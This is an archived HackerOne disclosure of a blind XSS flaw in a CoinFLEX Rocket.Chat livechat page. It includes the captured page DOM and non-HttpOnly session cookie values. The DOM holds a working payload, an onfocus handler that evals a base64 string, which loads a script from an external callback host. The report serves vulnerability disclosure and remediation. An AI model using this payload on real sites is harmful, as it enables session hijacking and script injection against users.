# Blind XSS

## Metadata
- **Source:** HackerOne
- **Report:** 1091118 | https://hackerone.com/reports/1091118
- **Submitted:** 2021-01-31
- **Reporter:** abhinav-porwal
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** CVE-2022-21830
- **Category:** web-api

## Summary
# Blind XSS
The page located at `https://livechat.coinflex.com/livechat` suffers from a Cross-site Scripting
(XSS) vulnerability. XSS is a vulnerability which occurs when user input is unsafely
encorporated into the HTML markup inside of a webpage. When not properly escaped an
attacker can inject malicious JavaScript that, once evaluated, can be used to hijack
authenticated sessions and rewrite th

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

# Blind XSS
The page located at `https://livechat.coinflex.com/livechat` suffers from a Cross-site Scripting
(XSS) vulnerability. XSS is a vulnerability which occurs when user input is unsafely
encorporated into the HTML markup inside of a webpage. When not properly escaped an
attacker can inject malicious JavaScript that, once evaluated, can be used to hijack
authenticated sessions and rewrite the vulnerable page's layout and functionality. The
following report contains information on an XSS payload that has fired on
`https://livechat.coinflex.com`, it can be used to reproduce and remediate the vulnerability.

### XSS Payload Fire Details
##### Vulnerable Page
`https://livechat.coinflex.com/livechat`

##### Referer
`https://coinflex.com/`

##### User Agent
`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/88.0.4324.96 Safari/537.36`

##### Cookies (Non-HTTPOnly)
`rc_rid=tjtzHoTga9m4EBM3o; rc_token=0917lb1vvydakojqdvlrm7; rc_room_type=l`

##### Document Object Model (DOM)
```html
<html dir="ltr"><head><meta charset="utf-8"><title>Rocket.Chat.Livechat</title><meta
name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet"
type="text/css" href="/livechat/61.chunk.a8a84.css"><script charset="utf-8"
src="/livechat/61.chunk.6a8fa.js"></script><link rel="stylesheet" type="text/css"
href="/livechat/62.chunk.e3920.css"><script charset="utf-8"
src="/livechat/62.chunk.39808.js"></script><script charset="utf-8"
src="/livechat/i18n.en.chunk.2a3c0.js"></script></head><body data-new-gr-c-s-check-
loaded="14.993.0" data-gr-ext-installed="" data-new-gr-c-s-loaded="14.993.0"><div
id="app"><div class="screen__sskEr"><style>
.screen__sskEr {
--color: #9437ff;
}
</style><div class="screen__inner__ihfK6 chat__1ggQU"><div
class="popover__container__1sbvl"><header class="header__13Vuj"><div
class="header__content__pXDMp"><div class="header__title__PtLVn">CoinFLEX Live
Chat</div></div><nav class="header__actions__aNMyg"><button
class="header__action__2wnEh" aria-label="Disable notifications"><svg
xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 18" width="20" height="20"><path
d="M4.619 10.532V6.374c0-2.296 1.962-4.158 4.381-4.158 2.419 0 4.381 1.862 4.381
4.158v4.158l1.643 3.118H2.976l1.643-3.118zm3.047 4.426h2.668c-.195.514-.716.884-
1.334.884s-1.139-.37-1.334-.884zm7.048-8.625C14.714 3.388 12.155 1 9 1 5.845 1 3.286
3.388 3.286 6.333V10.6L1 14.867h5.201C6.465 16.084 7.618 17 9 17s2.535-.916 2.799-
2.133H17L14.714 10.6V6.333z" fill="currentColor"
fill-rule="evenodd"></path></svg></button><button class="header__action__2wnEh" aria-
label="Minimize chat"><svg viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg"
width="20" height="20"><path d="M16.071 5L9 12.071 1.929 5" stroke="currentColor"stroke-width="1.5" fill="none"></path></svg></button><button
class="header__action__2wnEh" aria-label="Expand chat"><svg viewBox="0 0 20 20"
xmlns="http://www.w3.org/2000/svg" width="20" height="20"><path d="M15.286
1H2.715c-.947 0-1.714.767-1.714 1.714v12.571A1.714 1.714 0 002.715 17h12.571c.947 0
1.714-.768 1.714-1.715V2.715C17 1.767 16.233 1 15.286 1zm.571 14.286a.572.572 0
01-.571.571H2.715a.572.572 0
01-.571-.571V2.715c0-.315.256-.571.571-.571h12.571c.315
0 .571.256.571.571v12.571zM4.554 13.244a.429.429 0 010-.606l6.97-6.97-.025-.025-
3.213.012a.429.429 0 01-.429-.428V4.87c0-.237.192-.429.429-.429l4.857-.012c.237
0 .429.192.429.428l-.013 4.858a.429.429 0 01-.428.428h-.357a.429.429 0
01-.429-.428l.012-3.213-.025-.026-6.97 6.97a.429.429 0 01-.606 0l-.202-.202z" stroke-
width=".3" fill="currentColor" stroke="currentColor"></path></svg></button></nav><div
class="header__post__VA2cW"></div></header><div data-overlay-text="Drop here to
upload a file" class="drop__6UUiL drop--overlayed__JT4ny"><input type="file"
class="drop__input__2o6so"><main class="screen__main__DBTEi screen__main--
nopadding__16Bsg"><div class="chat__messages__f3sJg chat__messages--
atBottom__1wPuF"><div class="message-list__1jRl9"><ol class="message-
list__content__3TyF4"></ol></div></div></main><footer class="footer__1V22a"><div
class="footer__content__1tgEl"><div class="composer__27x96"><div
class="composer__actions__3eA8B"><button type="button"
class="composer__action__2ZuQd"><svg viewBox="0 0 20 20"
xmlns="http://www.w3.org/2000/svg" width="20" height="20"><g fill="none" fill-
rule="evenodd"><circle cx="12" cy="8" r="1" fill="currentColor"></circle><circle cx="8"
cy="8" r="1" fill="currentColor"></circle><circle cx="10" cy="10" r="7" stroke="currentColor"
stroke-width="1.5"></circle><path d="M7.172 12.328a4 4 0 005.656 0"
stroke="currentColor" stroke-width="1.5"></path></g></svg></button></div><div
contenteditable="true" data-placeholder="Type your message here"
class="composer__input___Cggy">"&gt;<input onfocus="eval(atob(this.id))"
id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHB
zOi8vYXNzZXRjeWJlci54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYS
k7" autofocus=""></div><div class="composer__actions__3eA8B"><button type="button"
class="composer__action__2ZuQd"><svg viewBox="0 0 24 24"
xmlns="http://www.w3.org/2000/svg" width="20" height="20"><path d="M10.342
13.283l9.56-10.359-13.049 8.264L1 8.778 21.506 1l-7.778 20.506-3.386-8.223z"
fill="currentColor" stroke="currentColor" stroke-width="1.5" fill-rule="evenodd" stroke-
linecap="round" stroke-linejoin="round"></path></svg></button></div></div></div><div
class="footer__content__1tgEl"><h3 class="powered-by__1DxxE">Powered by <a
href="https://rocket.chat" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0
1500 272" xmlns="http://www.w3.org/2000/svg" class="powered-by__logo__2Y08v"
width="60" height="10.88" role="img" aria-label="Rocket.Chat"><g fill="none" fill-
rule="evenodd"><path class="text" d="M461.588 132.646c0 15.237-5.687 25.243-16.607
30.016l15.699 59.582c.681 2.734-.681 4.092-3.186 4.092h-23.663c-2.274 0-3.41-1.135-
3.867-3.184l-15.244-57.76h-15.699v57.31c0 2.276-1.362 3.634-3.64 3.634h-23.663c-2.274
0-3.64-1.365-3.64-3.634V48.052c0-2.273 1.366-3.638 3.64-3.638h57.107c21.385 0 32.763
11.372 32.763 32.746v55.49zm-40.043 2.727c5.914 0 9.1-3.184 9.1-9.095V83.525c0-
5.911-3.186-9.092-9.1-9.092h-22.524v60.943l22.524-.004zm58.235-58.217c0-21.375
11.374-32.746 32.763-32.746h25.483c21.385 0 32.763 11.372 32.763 32.746v116.43c0
21.371-11.377 32.743-32.763 32.743h-25.483c-21.389 0-32.763-11.372-32.763-
32.743V77.156zm52.555 119.84c5.914 0 9.1-2.957 9.1-9.095V82.84c0-5.911-3.186-9.095-
9.1-9.095h-13.194c-5.914 0-9.1 3.184-9.1 9.095V187.9c0 6.134 3.186 9.091 9.1
9.091h13.194zm152.425-95.281c0 2.276-1.366 3.638-3.636 3.638h-22.751c-2.505 0-3.64-
1.361-3.64-3.638v-18.19c0-5.911-3.183-9.092-9.097-9.092h-11.832c-6.14 0-9.1 3.181-9.1
9.092v103.7c0 6.138 3.183 9.088 9.1 9.088h11.832c5.914 0 9.097-2.954 9.097-9.088v-
18.198c0-2.276 1.135-3.638 3.64-3.638h22.75c2.282 0 3.637 1.361 3.637 3.638v24.562c0
21.371-11.604 32.743-32.759 32.743h-25.483c-21.385 0-32.99-11.372-32.99-32.743V77.149c0-21.375 11.604-32.746 32.99-32.746h25.483c21.158 0 32.759 11.372
32.759 32.746v24.559zm96 124.618c-2.735 0-4.321-1.135-5.236-3.408l-28.662-67.542-
8.423 16.148v50.253c0 2.958-1.589 4.55-4.548 4.55h-21.843c-2.958 0-4.551-1.592-4.551-
4.55V48.954c0-2.953 1.593-4.549 4.551-4.549h21.843c2.956 0 4.548 1.592 4.548
4.55v70.495l35.037-71.634c1.14-2.273 2.736-3.41 5.237-3.41H802.6c3.413 0 4.778 2.276
3.182 5.456l-38.673 79.364 41.174 91.874c1.593 2.958.227 5.23-3.41
5.23H780.76zM915.67 70.791c0 2.273-.912 3.865-3.64 3.865h-56.88v45.48h43.456c2.281
0 3.64 1.365 3.64 3.865v22.513c0 2.503-1.366 3.869-3.64
3.869H855.15v45.934h56.88c2.735 0 3.64 1.138 3.64 3.638v22.743c0 2.273-.912 3.63-
3.64 3.63h-83.725c-2.05 0-3.416-1.365-3.416-3.63V48.048c0-2.273 1.366-3.638 3.416-
3.638h83.725c2.735 0 3.64 1.365 3.64 3.638V70.79zm105.56-26.381c2.501 0 3.64 1.365
3.64 3.638V70.79c0 2.273-1.139 3.638-3.64 3.638h-26.391v148.27c0 2.5-1.135 3.63-3.636
3.63H967.54c-2.282 0-3.64-1.13-3.64-3.63V74.429h-26.388c-2.282 0-3.64-1.365-3.64-

</details>

---
*Analysed by Claude on 2026-05-24*
